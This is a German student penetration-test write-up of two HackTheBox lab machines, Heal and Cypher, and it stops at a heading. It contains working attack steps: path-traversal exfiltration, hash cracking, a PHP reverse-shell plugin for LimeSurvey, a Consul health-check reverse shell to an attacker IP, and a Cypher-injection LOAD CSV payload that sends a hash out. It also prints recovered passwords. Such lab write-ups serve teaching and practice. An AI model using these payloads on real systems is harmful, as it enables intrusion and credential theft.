# Dokumentation: Penetrationstest HTB – Heal & Cypher

## 👥 Gruppenmitglieder
- Yanis Sebastian Zürcher (lyfe691)
- Jason Bichsel
- Dominik Könitzer

# Machine 1: Heal

## 🔹 Management Summary – Heal

Im Rahmen dieses Penetrationstests wurde die HTB-Maschine Heal (Schwierigkeit: Medium) vollständig kompromittiert.
Ziel war es, Schwachstellen innerhalb einer Webapplikation zu identifizieren, auszunutzen und schlussendlich Root-Rechte auf dem System zu erlangen.

Der Angriff erfolgte in mehreren Schritten:

- Recon identifizierte mehrere Subdomains und ein Rails‑Backend mit Path‑Traversal‑Schwachstelle.

- Über einen JWT‑Token Leak und Directory Traversal konnte die SQLite‑Datenbank exfiltriert und Passwort-Hashes extrahiert werden.

- Durch Credential Reuse erlangten wir Admin‑Zugriff auf LimeSurvey.

- Ein bekannter RCE-Exploit wurde verwendet, um eine Shell zu erhalten.

- Root-Zugriff erfolgte über eine falsch konfigurierte Consul‑Instanz via HTTP API.

Alle Schwachstellen wurden nachvollziehbar dokumentiert, mit technischen Details, Screenshots und empfohlenen Gegenmassnahmen.

![1744655136679](image/Dokumentation/1744655136679.png)

## Network Setup

Als erstes haben wir uns mit HTB durch openvpn verbunden:

```bash
sudo apt update
                                                                     
sudo apt install openvpn -yd

sudo openvpn Desktop/lab_lyfe691.ovpn

```

Das war erfolgreich, wie man auf der HTB Website sehen kann:

![alt text](image.png)

## Target Discovery

Die target ip ist: 10.10.11.46

Um sicherzustellen, dass ein Dienst auf Port 80 aktiv war, führten wir einen nmap Scan durch:

```bash
nmap -p 80 10.10.11.46
```

Resultat:

```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-14 13:57 EDT
Nmap scan report for 10.10.11.46
Host is up (0.10s latency).

PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.33 seconds
```

Wie man sieht, gab es einen Service auf Port 80.

## DNS Configuration for heal.htb

Während  wir verbunden waren, entschieden wir uns, auf http://10.10.11.46 zu gehen, um den Service zu sehen. Als wir dorthin gingen, wurden wir zu heal.htb redirected – hier der Beweis:

```shell
┌──(kali㉿kali)-[~]
└─$ curl -I http://10.10.11.46

HTTP/1.1 301 Moved Permanently
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 14 Apr 2025 18:38:43 GMT
Content-Type: text/html
Content-Length: 178
Connection: keep-alive
Location: http://heal.htb/
```

Damit wir die Seite sehen konnten, mussten wir den Hostnamen lokal auflösen. Dazu bearbeiteten wir die Datei /etc/hosts und verwiesen heal.htb auf die IP-Adresse der Maschine.

```bash
sudo nano /etc/hosts
```

added line:

```bash
10.10.11.46    heal.htb
```

![1744656432925](image/Dokumentation/1744656432925.png)

Diese Konfiguration ermöglichte es uns, die Web-Oberfläche über den korrekten virtuellen Host zu erreichen.

## Initial Web Recon – heal.htb

Dank der Konfiguration konnten wir die Seite nun mit Firefox sehen.
Wie man sieht, wurde eine Login-Page angezeigt, was darauf hindeutet, dass möglicherweise ein Backend existiert.

![1744660028161](image/Dokumentation/1744660028161.png)

Darum testeten wir die Login-Page und wie erwartet wurde ein Fehler angezeigt. Folglich überprüften wir die Console, um zu sehen, ob die Login-Page irgendwo hindeutet.

![1744660324409](image/Dokumentation/1744660324409.png)

Der error `Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at http://api.heal.htb/signin.` zeigt an das die seite versucht eine request zu machen an ein API backend, `api.heal.htb`

## Subdomain Enumeration – api.heal.htb

Damit wir die API sehen konnten, haben wir den Eintrag wie bereits bei heal.htb in der Datei /etc/hosts hinzugefügt.

```bash
sudo nano /etc/hosts
```

added line:

```bash
10.10.11.46    api.heal.htb
```

![1744663293352](image/Dokumentation/1744663293352.png)

Sobald wir das hinzugefügt hatten, konnten wir direkt mit der API interagieren.

## Framework Fingerprinting

Ich benutze curl um kurz zu sehen was es ergibt

```bash
curl -i http://api.heal.htb/
```

Die Antwort zeigte deutlich, dass die Seite von Ruby on Rails Version 7.1.4 betrieben wird. Beim Zugriff über Firefox wurde die standardmässige rails seite angezeigt.

![1744664202485](image/Dokumentation/1744664202485.png)

Response headers:

```shell
x-runtime: 0.024878
x-request-id: <...>
x-content-type-options: nosniff
Server: nginx/1.18.0 (Ubuntu)
```

## Looking at what we have found

Da wir nun Zugriff auf die API hatten, konnten wir die bisher gefundenen Sachen testen. Das Login und das Register der App funktionierten wie erwartet.

Wenn wir uns registrierten, sahen wir die Resume Builder Web App:

![1744665182786](image/Dokumentation/1744665182786.png)

Wir erkundeten uns noch ein wenig weiter und sahen die folgenden Seiten:

profile page:

![1744665820487](image/Dokumentation/1744665820487.png)

survey page:

![1744665981729](image/Dokumentation/1744665981729.png)

## Survey inspection

Als wir auf der Survey Page über den Button «hoverten», wurde eine PHP Page und eine neue Subdomain (take-survey.heal.htb) angezeigt. Im Unterricht schauten wir es uns mit PHP an und wir dachten, dass wir XSS oder so ausprobieren könnten, doch das ging nicht.

![alt text](indexphpsh.png)

Wie immer, wenn wir eine Seite ansehen wollten, fügten wir den Eintrag in der Datei `/etc/hosts` hinzu.

```bash
sudo nano /etc/hosts
```

added line:

```bash
10.10.11.46    take-survey.heal.htb
```

![alt text](Screenshot_2025-04-18_20_53_22.png)

so, jetzt können wir die survey page sehen:

![alt text](Screenshot_2025-04-18_21_05_21.png)

wir haben das survey gesendet, bin zurück und dann auf die expired seite gekommen, was mir dann anzeigt das es ein admin gibt, `ralph@heal.htb`.

![alt text](Screenshot_2025-04-19_15_13_54.png)

Das sagt uns das es auch einen Admin login oder so geben sollte. Deswegen haben wir uns mich entschieden einfach mal `/admin` bei der url einzugeben um zu sehen ob es etwas gibt:

![alt text](image-1.png)

wie man sehen kann hat es tatsächlich ein admin panel, aber da wir die login daten bzw. das Passwort nicht wissen müssen wir einen weg finden um es herauszufinden.

## Ralphs password

Nachdem auf der Survey expired‑Seite die Adresse ralph@heal.htb aufgetaucht war, brauchten wir nur noch dessen Kennwort, um uns in das Admin‑Backend einzuloggen.

#### 1. JWT‑Token abgreifen

Beim Registrieren/Anmelden auf heal.htb wurde im network tab das jwt zurückgeliefert (unten rechts im bild).

![image with  in dev tools token: ey](image-3.png)

also haben wir den token in eine variable gepackt um mein leben einfacher zu machen einfacher zu machen:

```bash
export TOKEN='eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo3fQ.bN47YVxPM1ZVqbw4J7oHZeDc3ixY3KO6yZpM5M3nfZE'
```

Mit einem schnellen Check verifizierten wir, dass das Token gültig war:

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ curl -i -H "Authorization: Bearer $TOKEN" http://api.heal.htb/profile  
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 19 Apr 2025 21:17:14 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 86
Connection: keep-alive
x-frame-options: SAMEORIGIN
x-xss-protection: 0
x-content-type-options: nosniff
x-permitted-cross-domain-policies: none
referrer-policy: strict-origin-when-cross-origin
vary: Accept, Origin
etag: W/"534bdd1e70aef84ee6023d1856c79b2e"
cache-control: max-age=0, private, must-revalidate
x-request-id: 5aba65c9-294b-432b-96df-f578c04f8c48
x-runtime: 0.003895

{"id":7,"email":"lyfe@gmail.com","fullname":"lyfe","username":"lyfe","is_admin":false}  
```

#### 2. Path‑Traversal verifizieren

Um die benötigte Anzahl `../` zu bestimmen, haben wir einen Mini‑Loop gebaut:

```bash
for d in {3..9}; do
  printf "[%s] " $d
  curl -s -H "Authorization: Bearer $TOKEN" \
       "http://api.heal.htb/download?filename=$(printf '../%.0s' $(seq 1 $d))/etc/passwd" |
       head -1
done
```

Ergebnis - bei fünf Punkten erschien `/etc/passwd`, Tiefe 2 zeigte eine vorhandene config.ru:

```
[3] {"errors":"File not found"}[4] {"errors":"File not found"}[5] root:x:0:0:root:/root:/bin/bash
[6] root:x:0:0:root:/root:/bin/bash
[7] root:x:0:0:root:/root:/bin/bash
[8] root:x:0:0:root:/root:/bin/bash
[9] root:x:0:0:root:/root:/bin/bash
```

#### 3. Rails‑Konfiguration exfiltrieren

```bash
curl -s -H "Authorization: Bearer $TOKEN" \
     "http://api.heal.htb/download?filename=../../config/database.yml" \
     -o database.yml
```

output (unser ziel ist production, das unterste):

```yaml
# SQLite. Versions 3.8.0 and up are supported.
#   gem install sqlite3
#
#   Ensure the SQLite 3 gem is defined in your Gemfile
#   gem "sqlite3"
#
default: &default
  adapter: sqlite3
  pool: <%= ENV.fetch("RAILS_MAX_THREADS") { 5 } %>
  timeout: 5000

development:
  <<: *default
  database: storage/development.sqlite3

# Warning: The database defined as "test" will be erased and
# re-generated from your development database when you run "rake".
# Do not set this db to the same as development or production.
test:
  <<: *default
  database: storage/test.sqlite3

production:
  <<: *default
  database: storage/development.sqlite3
```

#### 4. SQLite‑DB herunterladen

Wie man oben sehen kann ist die production datenbank unter `storage/development.sqlite3`, also haben wir sie heruntergeladen.

```bash
curl -s -H "Authorization: Bearer $TOKEN" \
     "http://api.heal.htb/download?filename=../../storage/development.sqlite3" \
     -o dev.sqlite3
file dev.sqlite3          # SQLite 3.x database
```

output:

```
dev.sqlite3: SQLite 3.x database, last written using SQLite version 3045002, writer version 2, read version 2, file counter 2, database pages 8, cookie 0x4, schema 4, UTF-8, version-valid-for 2

```

#### 5. Hashes dumpen

```bash
sqlite3 dev.sqlite3 \
  "SELECT email, password_digest FROM users;" > hashes.txt
```

hashes.txt:

```txt
ralph@heal.htb|$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG
test@htb.com|$2a$12$b/eb1KU/r9RfpyVRp2aBP.rDxE3p7.rRAjM8lCd0iLUnZh26VSpu.
nullbyte@heal.htb|$2a$12$xTfKk9gpBpZiSvIE.T5mMufHbAm/.c/kDKTBYg8cKcHxPwwU7gJgy
asdasd@gmail.com|$2a$12$5BTVuxrZTe31BRYWHD2ex.1FdTANkQnqSsaGwWgHBGq0heNTDlqGG
admii@gmail.com|$2a$12$HqR3ffCia8NuIrBFjS6tvexo/DDeBlCV5pwvo.v3WO6Z0iZM1/vaG
admin@gmail.com|$2a$12$Xe.3wFV2bDQHgJ8Bx6zX.uRho9IqV9i1o5mYT8x/0N.DSdLX25.GO
lyfe@gmail.com|$2a$12$j6pguy5SKwp6DppLiMtz1OQJS9ALkxTGInJkB9f/o6zcms5.D5Zre
```

#### 6. Nur Ralphs Hash isolieren & cracken

unser ziel ist nur ralphs pwd, also haben wir ihn isoliert und das pwd mit hashcat gecrackt:

```bash
grep '^ralph@' hashes.txt | cut -d'|' -f2 > ralph.hash
```

```bash
# rockyou ggf. entpacken da ich es noch nicht entpackt hatte:
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

```bash
# show flag zeigt den output an
hashcat -m 3200 ralph.hash /usr/share/wordlists/rockyou.txt --show
```

Hashcat Output:

`$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:147258369`

nice, jetzt haben wir ralphs pwd: `147258369`

#### 7. Erfolgreicher Admin‑Login

Mit

```
Benutzer : ralph@heal.htb
Passwort : 147258369
```

konnten wir uns unter http://take‑survey.heal.htb/admin einloggen und erhielten vollen Zugriff auf das LimeSurvey Backend (**Version 6.6.4, -> wichtig.**).

![alt text](Screenshot_2025-04-19_17_49_00.png)

## Reverse Shell – www-data via LimeSurvey Plugin Upload

Nachdem wir Zugriff auf das Admin panel von LimeSurvey hatten, haben wir nach der version 6.6.4 im internet gesucht um zu sehen ob es ein exploit gibt. Tatsächlich gab es ein RCE (remote code execution) exploit:

https://github.com/N4s1rl1/Limesurvey-6.6.4-RCE

Da Standart Payloads die web ui oft zum Absturz bringen (504 Gateway Timeout), haben wir ein nicht-blockierendes Reverse‑Shell‑Plugin mit hilfe des githubs erstellt, das sich problemlos installieren und triggern lässt.

#### 1. Exploit‑Plugin bauen, mit hilfe des github: https://github.com/N4s1rl1/Limesurvey-6.6.4-RCE

```bash
mkdir -p ~/heal_plugin && cd ~/heal_plugin
```

Reverse shell als php datei:

```php
cat > php-rev.php <<'EOF'
<?php
$ip = '10.10.14.199';  // ← meine tun0‑IP
$port = 9001;          // ← Listener‑Port

$cmd = "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
$payload = "curl -s -X POST --data \"\$($cmd)\" http://$ip:$port &";
system($payload);
?>
EOF
```

PLugin Metadaten (config.xml):

```xml
cat > config.xml <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<config>
  <metadata>
    <name>lyfe691-exploit</name>
    <type>plugin</type>
    <author>lyfe691</author>
    <version>1.0</version>
    <description>non-blocking reverse shell plugin</description>
    <license>GPLv3</license>
  </metadata>

  <files>
    <file>php-rev.php</file>
  </files>

  <compatibility>
    <version>6.0</version>
    <version>6.1</version>
    <version>6.6</version>
  </compatibility>
</config>
EOF
```

Zip archive erstellen damit wir es hochladen kann:

```bash
zip lyfe691-exploit.zip php-rev.php config.xml
```

#### 2. Plugin hochladen und aktivieren

Im Web-Interface unter http://take‑survey.heal.htb/admin:

    Configuration -> Plugins

    Auf auf Upload & install gecklickt -> lyfe691-exploit.zip ausgewählt

    Installieren:

![alt text](Screenshot_2025-04-19_20_22_46.png)

    Und dann noch aktivieren:

![alt text](Screenshot_2025-04-19_20_23_11.png)

#### 3. Listener im terminal öffnen

`nc -lvnp 9001`

#### 4. Reverse Shell triggern

Im Browser:

`http://take-survey.heal.htb/upload/plugins/lyfe691-exploit/php-rev.php`

-> Shell poppt in Kali auf:

```bash
connect to [10.10.14.199] from (UNKNOWN) [10.10.11.46] 52792
www-data@heal:/var/www/limesurvey$
```

![alt text](Screenshot_2025-04-19_20_30_08.png)

Jetzt hatten wir eine voll funktionsfähige shell als www-data auf der Maschine.

## User Flag

Nach dem Exploit über limesurvey hatten wir Zugriff als www-data.
Ziel war es nun, auf einen lokalen Benutzer mit echten Rechten zu wechseln. inkl userflag holen.

#### 1. Web-Passwort war nicht systemweit gültig

Zuerst versuchten wir das bereits gecrackte Web Passwort von ralph@heal.htb (147258369) für lokale Benutzer:

su ralph     # funktioniert nicht
su ron       # auch fehlgeschlagen

Beide Logins gaben Authentication failure zurück.

Das bestätigte, dass die gehashten Passwörter aus der Rails Datenbank nur für die Web App galten - nicht für Linux accs.

#### 2. Datenbank‑Passwort holen

Im Verzeichnis:

`/var/www/limesurvey/application/config/`

fanden wir in der Datei config.php die Zugangsdaten für die PostgreSQL Datenbank. inklusive Passort:

'username' => 'db_user',
'password' => 'AdmiDi0_pA$$w0rd',

Ganzer output:

```php
www-data@heal:~/limesurvey/upload/plugins/lyfe691-exploit$ `cat /var/www/limesurvey/application/config/config.php`
<t /var/www/limesurvey/application/config/config.php     
<?php if (!defined('BASEPATH')) exit('No direct script access allowed');
/*
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
|    'connectionString' Hostname, database, port and database type for 
|     the connection. Driver example: mysql. Currently supported:
|                 mysql, pgsql, mssql, sqlite, oci
|    'username' The username used to connect to the database
|    'password' The password used to connect to the database
|    'tablePrefix' You can add an optional prefix, which will be added
|                 to the table name when using the Active Record class
|
*/
return array(
        'components' => array(
                'db' => array(
                        'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',
                        'emulatePrepare' => true,
                        'username' => 'db_user', 
                        'password' => 'AdmiDi0_pA$$w0rd', <- pwd
                        'charset' => 'utf8',
                        'tablePrefix' => 'lime_',
                ),

                 'session' => array (
                        'sessionName'=>'LS-ZNIDJBOXUNKXWTIP',
                        // Uncomment the following lines if you need table-based sessions.
                        // Note: Table-based sessions are currently not supported on MSSQL server.
                        // 'class' => 'application.core.web.DbHttpSession',
                        // 'connectionID' => 'db',
                        // 'sessionTableName' => '{{sessions}}',
                 ),

                'urlManager' => array(
                        'urlFormat' => 'path',
                        'rules' => array(
                                // You can add your own rules here
                        ),
                        'showScriptName' => true,
                ),

                // If URLs generated while running on CLI are wrong, you need to set the baseUrl in the request component. For example:
                //'request' => array(
                //      'baseUrl' => '/limesurvey',
                //),
        ),
        // For security issue : it's better to set runtimePath out of web access
        // Directory must be readable and writable by the webuser
        // 'runtimePath'=>'/var/limesurvey/runtime/'
        // Use the following config variable to set modified optional settings copied from config-defaults.php
        'config'=>array(
        // debug: Set this to 1 if you are looking for errors. If you still get no errors after enabling this
        // then please check your error-logs - either in your hosting provider admin panel or in some /logs directory
        // on your webspace.
        // LimeSurvey developers: Set this to 2 to additionally display STRICT PHP error messages and get full access to standard templates
                'debug'=>0,
                'debugsql'=>0, // Set this to 1 to enanble sql logging, only active when debug = 2

                // If URLs generated while running on CLI are wrong, you need to uncomment the following line and set your
                // public URL (the URL facing survey participants). You will also need to set the request->baseUrl in the section above.
                //'publicurl' => 'https://www.example.org/limesurvey',

                // Update default LimeSurvey config here
        )
);
/* End of file config.php */
/* Location: ./application/config/config.php */
```

Da viele Systeme schwache Passwort policies und reuse verwenden, haben wir versucht, uns mit diesem Passwort als Benutzer ron einzuloggen.

#### 3. su auf ron

```
www-data@heal:~/limesurvey/upload/plugins/lyfe691-exploit$ su ron
su ron                                                                                                                                                                                                                                    
Password: AdmiDi0_pA$$w0rd                                                                                                                                                                                                                
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
```

War erfolgreich.

#### 4. User-Flag

Nach dem Wechsel in rons home dings:

```
whoami
ron
cd
chdir: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory

ls -la
total 32
drwxr-x--- 4 ron  ron  4096 Apr 19 05:31 .
drwxr-xr-x 4 root root 4096 Dec  9 12:53 ..
lrwxrwxrwx 1 root root    9 Dec  9 12:57 .bash_history -> /dev/null
-rw-r--r-- 1 ron  ron   220 Dec  9 12:53 .bash_logout
-rw-r--r-- 1 ron  ron  3771 Dec  9 12:53 .bashrc
drwx------ 2 ron  ron  4096 Dec  9 15:13 .cache
-rw-r--r-- 1 ron  ron   807 Dec  9 12:53 .profile
drwx------ 2 ron  ron  4096 Apr 19 05:32 .ssh
-rw-r----- 1 root ron    33 Apr 18 10:09 user.txt

cat user.txt
d18da46a08d09ab95187edcc99ae1188
```

![alt text](Screenshot_2025-04-19_21_38_25.png)

wie man sehen kann ist das userflag:

`d18da46a08d09ab95187edcc99ae1188`

### HTB user flag owned:

![alt text](Screenshot_2025-04-20_15_31_17.png)

## Root Flag

Nach dem Zugriff als Benutzer ron haben wir mit netstat überprüft, welche Ports auf der Maschine geöffnet waren:

```bash
netstat -tulnp | grep LISTEN
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:8600          0.0.0.0:*               LISTEN      -                 
tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN      -                 
tcp        0      0 127.0.0.1:8503          0.0.0.0:*               LISTEN      -                 
tcp        0      0 127.0.0.1:8300          0.0.0.0:*               LISTEN      -                 
tcp        0      0 127.0.0.1:8301          0.0.0.0:*               LISTEN      -                 
tcp        0      0 127.0.0.1:8302          0.0.0.0:*               LISTEN      -                 
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                 
tcp        0      0 127.0.0.1:3001          0.0.0.0:*               LISTEN      -                 
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                 
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                 
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                 
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                 
tcp6       0      0 :::22                   :::*                    LISTEN      -   
```

Interessanter Output:

`tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN      -`

Der Dienst auf Port 8500 hörte nur lokal - das bedeutet: wir mussten ihn über einen SSH tunnel zugänglich machen.
SSH Port Forwarding zur lokalen Maschine

┌──(kali㉿kali)-[~]
└─$ ssh -L 8500:127.0.0.1:8500 ron@10.10.11.46

Verbindung erfolgreich:

```
──(kali㉿kali)-[~]
└─$ ssh -L 8500:127.0.0.1:8500 ron@10.10.11.46

ron@10.10.11.46's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Apr 20 06:57:25 PM UTC 2025

  System load:  0.01              Processes:             272
  Usage of /:   84.6% of 7.71GB   Users logged in:       0
  Memory usage: 27%               IPv4 address for eth0: 10.10.11.46
  Swap usage:   0%

  => There are 4 zombie processes.


Expanded Security Maintenance for Applications is not enabled.

29 updates can be applied immediately.
18 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Apr 19 07:40:49 2025 from 10.10.14.29
ron@heal:~$
```

Danach konnten wir im Browser auf http://localhost:8500 zugreifen und sah das Consul UI.

![alt text](Screenshot_2025-04-20_15_15_55.png)

### Exploiting Consul via HTTP API

Mit Consuls HTTP API lässt sich ein "Health Check" registrieren, der beliebige Kommandos ausführt. Wir nutzten das, um ein Root Reverse shell zu bekommen:

```
ron@heal:~$ curl -X PUT -d '{
  "ID": "lyfe-root",
  "Name": "lyfe-root",
  "Address": "127.0.0.1",
  "Port": 80,
  "Check": {
    "DeregisterCriticalServiceAfter": "90m",
    "Args": ["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.14.199/9001 0>&1"],
    "Interval": "10s"
  }
}' http://localhost:8500/v1/agent/service/register
```

#### Listener auf Kali öffnen

Parallel auf meinem Kali Terminal:

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9001

listening on [any] 9001 ...
connect to [10.10.14.199] from (UNKNOWN) [10.10.11.46] 59444
bash: cannot set terminal process group (143669): Inappropriate ioctl for device
bash: no job control in this shell
root@heal:/# whoami
whoami
root
```

shell popt, root zugriff bestätigt

#### Root Flag lesen

als erstes die directories/files listen:

```
root@heal:/# ls -la  
ls -la
total 72
drwxr-xr-x  19 root root  4096 Dec  8 13:57 .
drwxr-xr-x  19 root root  4096 Dec  8 13:57 ..
lrwxrwxrwx   1 root root     7 Feb 17  2023 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Dec  8 12:59 boot
dr-xr-xr-x   2 root root  4096 Dec  8 13:57 cdrom
drwxr-xr-x  20 root root  4020 Apr 18 10:01 dev
drwxr-xr-x 117 root root  4096 Jan  7 15:01 etc
drwxr-xr-x   4 root root  4096 Dec  9 12:53 home
lrwxrwxrwx   1 root root     7 Feb 17  2023 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Feb 17  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Feb 17  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Feb 17  2023 libx32 -> usr/libx32
drwx------   2 root root 16384 Sep  4  2024 lost+found
drwxr-xr-x   2 root root  4096 Feb 17  2023 media
drwxr-xr-x   2 root root  4096 Dec  8 13:57 mnt
drwxr-xr-x   2 root root  4096 Dec  8 13:57 opt
dr-xr-xr-x 327 root root     0 Apr 18 10:01 proc
drwx------   7 root root  4096 Apr 18 10:09 root
drwxr-xr-x  31 root root   900 Apr 20 18:57 run
lrwxrwxrwx   1 root root     8 Feb 17  2023 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Dec  8 13:57 srv
dr-xr-xr-x  13 root root     0 Apr 18 10:01 sys
drwxrwxrwt  14 root root  4096 Apr 20 18:48 tmp
drwxr-xr-x  14 root root  4096 Dec  8 13:57 usr
drwxr-xr-x  13 root root  4096 Dec  8 13:57 var
```

Beim dutchstöbern haben wir folgendes file gefunden: `root.txt`.

Jetzt mussten wir es nur noch lesen:

```
root@heal:/# cat /root/root.txt
cat /root/root.txt
7abbed710c05c4d217992b4d3efc3721
```

wie man sehen kann ist das root flag: `7abbed710c05c4d217992b4d3efc3721`

![alt text](Screenshot_2025-04-20_15_24_38.png)

### HTB Root Flag owned:

![alt text](Screenshot_2025-04-20_15_32_57.png)

## HTB Heal – Komplett owned

- **User Flag:** `d18da46a08d09ab95187edcc99ae1188`
- **Root Flag:** `7abbed710c05c4d217992b4d3efc3721`

![alt text](Screenshot_2025-04-20_15_32_08.png)


## Empfehlungen & Geeignete Gegenmassnahmen
1. **Input Validierung & sichere API-Endpunkte**

   - Die Webanwendung litt unter Directory Traversal aufgrund fehlender Validierung im download?filename=... Parameter.
   → **Massnahme:** Strikte Validierung erlaubter Pfade, Nutzung von Whitelists und serverseitige Canonicalisierung.

2. **JWT-Schutz verbessern**

   - Die JWT-Tokens waren leicht abfangbar und dauerhaft gültig.
   → **Massnahme:** JWT mit kurzem Ablaufdatum und Rotation verwenden, zusätzlich Tokens über HTTPS transportieren.

3. **Datenbankzugänge absichern**

   - Die Rails-Datenbank war über Path Traversal erreichbar, und sensible Dateien wie database.yml konnten exfiltriert werden.
   → **Massnahme:** Produktionsdatenbanken nicht im Webroot ablegen und Dateisystem-Zugriffsrechte hart absichern.

4. **Hash-Sicherheit**

   - Benutzerpasswörter waren in einer SQLite-Datei abgelegt, ohne zusätzlichen Schutz.
   → **Massnahme:** Salted Hashes mit starken Algorithmen (z. B. Argon2) und Datei-Zugriff nur für autorisierte Benutzer.

5. **Admin Panel absichern**

   - Das Admin-Interface war öffentlich erreichbar und durch Passwort-Wiederverwendung angreifbar.
   → **Massnahme:** Admin-Zugang auf bestimmte IP-Ranges beschränken, Zwei-Faktor-Authentifizierung einführen.

6. **LimeSurvey RCE über Plugin-Upload**

   - Die eingesetzte Version war verwundbar gegenüber Remote Code Execution durch Plugin-Upload.
   → **Massnahme:** Regelmässige Updates aller Drittanbieter-Software, speziell CMS/Survey-Systeme.

7. **SSH- und Benutzer-Passwortpolitik**

   - Das Datenbankpasswort AdmiDi0_pA$$w0rd wurde auch für das Systemkonto ron verwendet.
   → **Massnahme:** Trennung von Web/DB-Passwörtern und starke Passwortpolicy mit Rotation.

8. **Lokale Dienste wie Consul absichern**

   - Der Consul-Dienst auf Port 8500 konnte durch lokalen Zugriff und API-Manipulation zu Root-RCE führen.
   → **Massnahme:** Dienste wie Consul nur mit Authentifizierung betreiben und per Firewall absichern (z. B. localhost‑Binding, ACLs, Tokens).

# Machine 2: Cypher

## 🔹 Management Summary – Cypher
Bei der HTB-Maschine Cypher (Schwierigkeit: Medium) wurde ein erfolgreicher Angriff durchgeführt, der zu einer vollständigen Kompromittierung inklusive Root-Zugriff führte.

Die Sicherheitslücken lagen primär im Umgang mit Neo4j und unsicheren APOC-Funktionen:

- Die Webanwendung zeigte Schwächen bei der Eingabevalidierung und war anfällig für Cypher-Injection.

- Über LOAD CSV konnte ein Hash aus der Datenbank exfiltriert werden.

- Anschliessend wurde durch eine unsichere APOC-Prozedur (getUrlStatusCode) eine Remote Code Execution erzielt.

- Nach dem initialen Zugriff als neo4j wurde Root-Rechte über eine lokal auffindbare SUID‑Shell erlangt.


## 1. Netzwerkanbindung

Wie immer starten wir mit der Verbindung zum HTB‑Netzwerk via OpenVPN:

```bash
sudo openvpn ~/Desktop/lab_lyfe691.ovpn
```

Verbindung wird durch die HTB‑Website bestätigt:

![VPN connected](image.png)

---

## 2. Zielerkennung & Vorbereitung

Ziel-IP von HTB erhalten: `10.10.11.57`

Vollständiger nmap‑Scan mit Versionserkennung, OS‑Erkennung, Scripts und Aggressivität `T4`:

```bash
nmap -sV -A -T4 10.10.11.57 -oN nmap_cypher.txt
```

Output zeigt SSH und HTTP:

```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

![nmap result](Screenshot_2025-05-05_14_11_01.png)

Wir testen den HTTP‑Zugang über den Browser und merken schnell, dass die Seite `cypher.htb` erwartet – wir werden automatisch redirected.

Daher passen wir die `/etc/hosts` Datei an:

```bash
sudo nano /etc/hosts
```

```txt
10.10.11.57   cypher.htb
```

![hosts config](Screenshot_2025-05-05_14_12_29-1.png)

---

## 3. Web‑Enumeration & Eingabeprüfung

Direkt auf `http://cypher.htb` zeigt sich eine Seite mit Login‑Maske.

![alt text](Screenshot_2025-05-05_16_06_14.png)


Wir testen `dirsearch`, um weitere Pfade zu finden:

```
/about
/api/ → zeigt /api/docs
/demo  → Login Page
/login
/testing/
```

![dirsearch](Screenshot_2025-05-05_14_28_23-2.png)

Beim Testen von SQL‑Injection im Login mit `' OR 1=1` erhalten wir direkt einen Neo4j‑Fehler:

![neo4j error](Screenshot_2025-05-05_14_49_33-1.png)

Das ist ein starker Hinweis: Backend nutzt **Neo4j** und **unsichere String‑Konkatenation**. Wir entscheiden uns, gezielt Cypher‑Injection zu testen.

---

## 4. Datenabfluss mit LOAD CSV auslösen

Ziel: Hash exfiltrieren.

Wir starten einen Python‑HTTP‑Server:

```bash
python3 -m http.server 8000
```

Dann testen wir eine modifizierte Payload mit `LOAD CSV` direkt in den Username‑Feld:

```json
{
  "username": "admin' OR 1=1  LOAD CSV FROM 'http://10.10.14.204:8000/leak='+h.value AS y RETURN ''//",
  "password": "123"
}
```

Im HTTP‑Server erscheint sofort:

```
GET /leak=9f54ca... HTTP/1.1
```

![hash leak](Screenshot_2025-05-05_15_19_21.png)

→ Funktioniert. Hash erfolgreich abgegriffen.

---

## 5. RCE mit getUrlStatusCode() via APOC

